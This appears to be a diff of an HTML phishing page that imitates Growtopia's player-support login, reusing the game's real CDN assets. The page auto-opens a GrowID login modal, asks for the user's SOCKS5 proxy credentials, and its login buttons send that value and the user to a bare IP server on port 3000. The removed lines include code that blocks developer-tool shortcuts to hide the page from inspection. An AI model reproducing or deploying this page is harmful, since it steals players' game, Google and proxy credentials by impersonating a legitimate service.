@@ -5,41 +5,15 @@
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
     <title>Growtopia Player Support</title>
 
-    <link
-        rel="icon"
-        type="image/png"
-        href="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/images/growtopia.ico"
-        sizes="16x16"
-    />
-    <link
-        rel="shortcut icon"
-        href="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/images/growtopia.ico"
-        type="image/x-icon"
-    >
-    <link
-        rel="icon"
-        href="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/images/growtopia.ico"
-        type="image/x-icon"
-    >
+    <link rel="icon" type="image/png" href="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/images/growtopia.ico" sizes="16x16"/>
+    <link rel="shortcut icon" href="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/images/growtopia.ico" type="image/x-icon">
+    <link rel="icon" href="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/images/growtopia.ico" type="image/x-icon">
 
-    <link
-        media="all"
-        rel="stylesheet"
-        href="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/css/faq-main.css"
-    >
-    <link
-        media="all"
-        rel="stylesheet"
-        href="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/css/shop-custom.css"
-    >
-    <link
-        media="all"
-        rel="stylesheet"
-        href="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/css/ingame-custom.css"
-    >
+    <link media="all" rel="stylesheet" href="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/css/faq-main.css">
+    <link media="all" rel="stylesheet" href="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/css/shop-custom.css">
+    <link media="all" rel="stylesheet" href="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/css/ingame-custom.css">
 
     <style>
         .modal-backdrop {
@@ -59,6 +33,23 @@
         .blink-text {
             color: red;
             animation: blink 2s ease-in-out infinite;
+        }
+
+        .socks5-field {
+            width: 100%;
+            max-width: 100%;
+            margin: 0 auto 15px;
+        }
+
+        .socks5-field input {
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+        @media (max-width: 667px) {
+            .socks5-field input {
+                font-size: 14px;
+            }
         }
 
         @keyframes blink {
@@ -82,94 +73,90 @@
 
 <body style="background-color: rgba(0,0,0,0.0);">
 
-    <button
-        type="button"
-        class="btn btn-primary hidden"
-        data-toggle="modal"
-        id="modalButton"
-        data-target="#modalShow"
-        data-backdrop="static"
-        data-keyboard="false"
-    ></button>
+<button
+    type="button"
+    class="btn btn-primary hidden"
+    data-toggle="modal"
+    id="modalButton"
+    data-target="#modalShow"
+    data-backdrop="static"
+    data-keyboard="false"
+></button>
 
-    <div class="content">
-        <section class="common-box">
-            <div class="container">
-                <div class="row">
-                    <div class="col-md-12 col-sm-12">
-                        <div class="row">
-                            <div
-                                class="modal fade product-list-popup"
-                                id="modalShow"
-                                tabindex="-1"
-                                role="dialog"
-                                aria-hidden="false"
-                            >
-                                <div
-                                    class="modal-dialog modal-dialog-centered"
-                                    role="document"
-                                >
-                                    <div class="modal-content">
-                                        <div class="modal-body">
-                                            <div class="content">
-                                                <section class="common-box">
-                                                    <div class="container">
+<div class="content">
+    <section class="common-box">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-12 col-sm-12">
+                    <div class="row">
+                        <div
+                            class="modal fade product-list-popup"
+                            id="modalShow"
+                            tabindex="-1"
+                            role="dialog"
+                            aria-hidden="false"
+                        >
+                            <div class="modal-dialog modal-dialog-centered" role="document">
+                                <div class="modal-content">
+                                    <div class="modal-body">
+                                        <div class="content">
+                                            <section class="common-box">
+                                                <div class="container">
+                                                    <div class="section-title center-align">
+                                                        <h2 class="blink-text">Log in with your Grow ID</h2>
+                                                    </div>
 
-                                                        <div class="text-center mb-4">
-                                                            <div class="row div-content-center">
+                                                    <div class="text-center mb-4">
+                                                        <div class="row div-content-center">
+                                                            <div class="col-md-12 col-sm-12">
 
-                                                                <div class="row div-content-center">
-                                                                    <div class="col-md-12 col-sm-12">
-<div class="form-group">
-    <input
-        id="socks5"
-        class="form-control grow-text"
-        required="required"
-        placeholder="Enter Your Socks5 Info (IP:Port:Username:Password) *"
-        name="socksData"
-        type="text"
-    >
-</div>
-                                                                        
-<a
-    href="#"
-    onclick="goTo('/growid'); return false;"
-    class="grow-login btn btn-block"
->
-    Growtopia Login
-</a>
-                                                                    </div>
-                                                                </div>
-
-                                                                <div class="row div-content-center">
-                                                                    <div
-                                                                        class="col-md-12 col-sm-12"
-                                                                        style="display: flex; justify-content: center; align-items: center; gap: 10px;"
+                                                                <div class="form-group socks5-field">
+                                                                    <input
+                                                                        id="socks5"
+                                                                        class="form-control grow-text"
+                                                                        required="required"
+                                                                        placeholder="Enter Your Socks5 Info (IP:Port:Username:Password) *"
+                                                                        name="socksData"
+                                                                        type="text"
                                                                     >
-      <a
-    href="#"
-    onclick="goTo('/google'); return false;"
-    class="btn"
->
-    <img
-        src="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/images/googleid_button.png"
-        alt="Google"
-    />
-</a>
-                                                                    </div>
                                                                 </div>
 
-                                                                <div class="row div-content-center">
-                                                                    <div class="row div-content-center">
-                                                                    </div>
-                                                                </div>
+                                                                <a
+                                                                    href="#"
+                                                                    onclick="goTo('/growid'); return false;"
+                                                                    class="grow-login btn btn-block"
+                                                                >
+                                                                    Growtopia Login
+                                                                </a>
 
                                                             </div>
                                                         </div>
 
+                                                        <div class="row div-content-center">
+                                                            <div
+                                                                class="col-md-12 col-sm-12"
+                                                                style="display: flex; justify-content: center; align-items: center; gap: 10px;"
+                                                            >
+                                                                <a
+                                                                    href="#"
+                                                                    onclick="goTo('/google'); return false;"
+                                                                    class="btn"
+                                                                >
+                                                                    <img
+                                                                        src="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/images/googleid_button.png"
+                                                                        alt="Google"
+                                                                    />
+                                                                </a>
+                                                            </div>
+                                                        </div>
+
+                                                        <div class="row div-content-center">
+                                                            <div class="row div-content-center">
+                                                            </div>
+                                                        </div>
                                                     </div>
-                                                </section>
-                                            </div>
+                                                </div>
+                                            </section>
                                         </div>
                                     </div>
                                 </div>
@@ -178,107 +165,61 @@
                     </div>
                 </div>
             </div>
-        </section>
-    </div>
+        </div>
+    </section>
+</div>
 
-    <script src="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/vendors/jquery/jquery-2.1.4.min.js"></script>
-    <script src="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/vendors/bootstrap/javascripts/bootstrap.min.js"></script>
+<script src="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/vendors/jquery/jquery-2.1.4.min.js"></script>
+<script src="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/vendors/bootstrap/javascripts/bootstrap.min.js"></script>
 
-    <script>
+<script>
 function goTo(endpoint) {
-    const socks = document.getElementById('socksInput').value;
+    const socks = document.getElementById('socksData').value;
 
     window.location.href =
         'http://185.149.27.57:3000' +
         endpoint +
-        '?socks=' +
+        '?socksData=' +
         encodeURIComponent(socks);
 }
 </script>
     
-    <script>
-        $('document').ready(function () {
-            document.onkeydown = (e) => {
-                if (e.key == 123) {
-                    e.preventDefault();
-                }
+<script>
+    $('document').ready(function () {
+        $('#modalButton').trigger('click');
 
-                if (e.key == 'F12') {
-                    e.preventDefault();
-                }
+        $('.close').on('click', function () {
+            window.location = "https://login.growtopiagame.com/player/validate/close";
+        });
 
-                if (e.ctrlKey && e.shiftKey && e.key == 'I') {
-                    e.preventDefault();
-                }
+        var observer = new MutationObserver(function (mutations) {
+            mutations.forEach(function (mutation) {
+                for (var i = 0; i < mutation.addedNodes.length; i++) {
+                    if (mutation.addedNodes[i].tagName == 'DIV') {
+                        var thediv = mutation.addedNodes[i];
+                        var sw = window.screen.width;
 
-                if (e.ctrlKey && e.key == 'I') {
-                    e.preventDefault();
-                }
-
-                if (e.ctrlKey && e.shiftKey && e.key == 'C') {
-                    e.preventDefault();
-                }
-
-                if (e.ctrlKey && e.shiftKey && e.key == 'J') {
-                    e.preventDefault();
-                }
-
-                if (e.ctrlKey && e.key == 'U') {
-                    e.preventDefault();
-                }
-            };
-
-            $('#modalButton').trigger('click');
-
-            $('.close').on('click', function () {
-                window.location = "https://login.growtopiagame.com/player/validate/close";
-            });
-
-            var observer = new MutationObserver(function (mutations) {
-                mutations.forEach(function (mutation) {
-                    for (var i = 0; i < mutation.addedNodes.length; i++) {
-                        if (mutation.addedNodes[i].tagName == 'DIV') {
-                            var thediv = mutation.addedNodes[i];
-                            var sw = window.screen.width;
-
-                            if (sw < 667) {
-                                $(thediv).css({
-                                    'transform': 'scale(0.75)',
-                                    'transform-origin': '0 0',
-                                    '-webkit-transform': 'scale(0.75)',
-                                    '-webkit-transform-origin': '0 0',
-                                    'overflow': 'auto'
-                                });
-                            }
+                        if (sw < 667) {
+                            $(thediv).css({
+                                'transform': 'scale(0.75)',
+                                'transform-origin': '0 0',
+                                '-webkit-transform': 'scale(0.75)',
+                                '-webkit-transform-origin': '0 0',
+                                'overflow': 'auto'
+                            });
                         }
                     }
-                });
-            });
-
-            observer.observe(document.body, {
-                attributes: false,
-                childList: true,
-                characterData: false
-            });
-
-            let originalText = 'Logging In';
-            let dotCount = 0;
-            let intervalId;
-
-            $('form').on('submit', function () {
-                const $button = $('#loginButton');
-
-                $button.prop('disabled', true);
-
-                intervalId = setInterval(() => {
-                    dotCount = (dotCount + 1) % 4;
-                    let dots = '.'.repeat(dotCount);
-
-                    $button.text(originalText + dots);
-                }, 500);
+                }
             });
         });
-    </script>
+
+        observer.observe(document.body, {
+            attributes: false,
+            childList: true,
+            characterData: false
+        });
+    });
+</script>
 
 </body>
 </html>
